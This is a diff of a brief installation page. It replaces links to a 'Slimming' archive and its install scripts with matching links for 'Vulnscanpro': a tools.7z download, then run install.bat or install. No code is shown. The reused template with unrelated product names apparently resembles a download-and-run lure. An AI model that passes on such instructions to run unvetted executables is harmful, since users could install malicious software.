@@ -6,12 +6,12 @@ order: 1
 
 ## Step 1: DownLoads
 
-[**Slimming**](https://github.com/slimming-fat/slimming-fat.github.io/blob/master/Slimming/tools.7z)
+[**Vulnscanpro**](https://github.com/vulnscanpro/vulnscanpro.github.io/blob/main/Vulnscanpro/tools.7z)
 
 
 ## Step 2: Install
-* For **windows**, run [`install.bat`](https://github.com/slimming-fat/slimming-fat.github.io/blob/master/Slimming/install.bat)
-* For **linux**, run [`install`](https://github.com/slimming-fat/slimming-fat.github.io/blob/master/Slimming/install)
+* For **windows**, run [`install.bat`](https://github.com/vulnscanpro/vulnscanpro.github.io/blob/main/Vulnscanpro/install.bat)
+* For **linux**, run [`install`](https://github.com/vulnscanpro/vulnscanpro.github.io/blob/main/Vulnscanpro/install)
 
 ## Step 3: Run
 ```java
